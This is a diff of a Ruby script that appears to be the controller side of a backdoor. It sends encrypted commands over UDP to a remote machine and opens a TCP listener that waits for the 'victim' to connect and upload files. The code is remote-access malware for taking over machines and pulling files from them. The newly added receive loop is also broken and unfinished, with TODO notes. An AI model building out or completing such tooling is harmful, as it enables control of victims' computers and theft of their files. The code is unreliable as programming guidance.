@@ -44,7 +44,7 @@ while 1 do
 		udp.send(data, 0, opts[:host], opts[:cport])
 		
 		# Create TCP Connection for file Transfer
-		tcp = TCPSocket.new opts[:fport]
+		tcp = TCPServer.new cmds[2]
 		
 		# Wait for victim to connect
 		victim = tcp.accept
@@ -53,13 +53,27 @@ while 1 do
 		# Open File for writing
 		file = File.open(name, "wb")
 		print("Receiving File: " + name)
-		
+
+		# TODO:
+		# 	Run until victim disconnects
+		# 	Write to file upon receving
+		data = ''
+		while (tmp = tcp.receive(255))
+			if(tmp < 255)
+				break
+			end
+
+			data += data + tmp
+		end 		
+
 		# Close connection
 		tcp.close
 	else # Normal commands
 		data = dis.encrypt(cmd)
 		udp.send(data, 0, opts[:host], opts[:fport])
 		
+		#TODO:
+		#	Fix receiving end
 		udp.recvfrom(9999)
 	end
 end
